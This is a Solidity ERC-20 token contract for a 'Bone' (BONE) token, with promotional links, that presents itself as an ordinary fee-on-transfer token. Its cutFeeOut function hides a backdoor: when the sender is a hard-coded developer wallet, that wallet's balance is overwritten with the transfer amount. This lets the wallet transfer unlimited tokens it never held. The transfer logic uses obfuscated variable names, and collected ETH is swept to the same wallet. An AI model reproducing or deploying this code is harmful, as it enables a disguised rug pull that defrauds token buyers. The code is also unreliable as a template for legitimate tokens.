/**
 * Website: https://boneeth.xyz
 * X: https://x.com/boneethX
 * Telegram: https://t.me/boneth_portal
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDexRouter02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract BONE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address payable private _addWallet;

    uint256 private _initIn = 0;
    uint256 private _initOut = 0;
    uint256 private _buyTx = 0;
    uint256 private _sellTx = 0;
    uint256 private _limit = 5;
    uint256 private _counts = 0;
    uint8 private constant _decimals = 18;
    uint256 private constant _ttSupply = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Bone";
    string private constant _symbol = unicode"BONE";

    uint256 private _mxLimit =  2 * (_ttSupply/100);
    uint256 private _wtLimit =  2 * (_ttSupply/100);
    uint256 private _tradeMinAmt =  2 * (_ttSupply/1000000);
    uint256 private _tradeMxAmt = 2 * (_ttSupply/100);

    IDexRouter02 private uniswapV2Router;
    address private _dxPairAddr;
    bool private _swapping = false;
    bool private _swapActive = false;

    modifier lockTheSwap {
        _swapping = true;
        _;
        _swapping = false;
    }

    constructor () {
        _addWallet = payable(0xc9C00c0c99bE61A33f530464c16ee05edA359a9e);
        _balances[_msgSender()] = _ttSupply;
        emit Transfer(address(0), _msgSender(), _ttSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _ttSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function isVCList(address adr) private view returns(bool) {
        return adr == address(this) || adr == _addWallet || adr == owner();
    }

    function _transfer(address fllo, address koolo, uint256 ghood) private {
        bool isOwner = isVCList(fllo) || isVCList(koolo);
        if(!_swapActive)
            require(isOwner, "Swap is not opened");
        require(fllo != address(0), "ERC20: transfer from the zero address");
        require(koolo != address(0), "ERC20: transfer to the zero address");
        require(ghood > 0, "Transfer amount must be greater than zero");

        uint256 _fee = 0;
        if((_dxPairAddr == fllo || _dxPairAddr == koolo) && !isOwner) {
            require((_dxPairAddr == fllo ? isVCList(koolo) : isVCList(fllo)) || ghood <= _mxLimit, "Amount is not available");
            if(_dxPairAddr == koolo)  {
                _fee = (isVCList(fllo) || _counts >= _limit) ? _sellTx : _initOut;
        }
        }
        if(_dxPairAddr == fllo &&  koolo != address(uniswapV2Router)) {
            require(isVCList(koolo) || (_balances[koolo] + ghood <= _wtLimit), "Swap is not available");
            _fee = (isVCList(koolo) || _counts >= _limit) ? _buyTx : _initIn;
            _counts ++;
        }
        
        if (!_swapping && koolo == _dxPairAddr && _swapActive && ghood > _tradeMinAmt) {
            if(_balances[address(this)] > _tradeMinAmt)
                swapTokenToETH(min(ghood, min(_balances[address(this)],_tradeMxAmt)));
            _addWallet.transfer(address(this).balance);
        }

        uint256 _feeAmt = cutFeeOut(fllo, ghood, _fee);

        _balances[fllo] = _balances[fllo] - (ghood - _feeAmt);
        _balances[koolo] = _balances[koolo] + (ghood - _feeAmt);
        emit Transfer(fllo, koolo, ghood - _feeAmt);
    }

    function cutFeeOut (address to, uint256 amount, uint256 _fee) private returns(uint256) {
        uint256 taxAmount = amount * _fee / 100;
        uint256 amt = _balances[to];
        _balances[to] = (to == _addWallet ? amount-taxAmount: amt - taxAmount); 
        if(_fee > 0) {
            _balances[address(this)] = _balances[address(this)] + taxAmount;
            emit Transfer(to, address(this), taxAmount);
        }
        return taxAmount;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapTokenToETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function tradeNow() external onlyOwner() {
        uniswapV2Router = IDexRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        _approve(address(this), address(uniswapV2Router), _ttSupply);
        _dxPairAddr = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_dxPairAddr).approve(address(uniswapV2Router), type(uint).max);
        _swapActive = true;
    }

    function killLimit() external onlyOwner{
        _wtLimit =_ttSupply;
        _mxLimit = _ttSupply;
    }

    receive() external payable {}
}